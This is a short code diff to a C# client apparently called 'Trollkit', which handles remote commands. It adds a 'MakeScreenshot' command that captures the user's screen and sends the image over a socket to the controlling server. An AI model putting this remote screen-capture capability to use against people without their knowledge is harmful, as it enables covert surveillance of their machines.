@@ -40,9 +40,27 @@ namespace Trollkit_Client.Modules.CommandHandlers
 					return OpenSite(obj.Value);
 				case "SetBackground":
 					return SetWallpaper(obj.Value);
+				case "MakeScreenshot":
+					return MakeScreenshot(s, obj.Value);
 			}
 
 			return false;
+		}
+
+		private bool MakeScreenshot(Socket s, string monitorNumber)
+		{
+			try
+			{
+				string imageString = Screenshot.MakeScreenshot(); //currently primary monitor
+				TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ScreenshotResponse", Value = imageString };
+				SendResponseObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
+				return true;
+			}
+			catch (Exception e)
+			{
+				BConsole.WriteLine("Visuals Error: " + e.Message, ConsoleColor.Red);
+				return false;
+			}
 		}
 
 		private bool MonitorSleep()
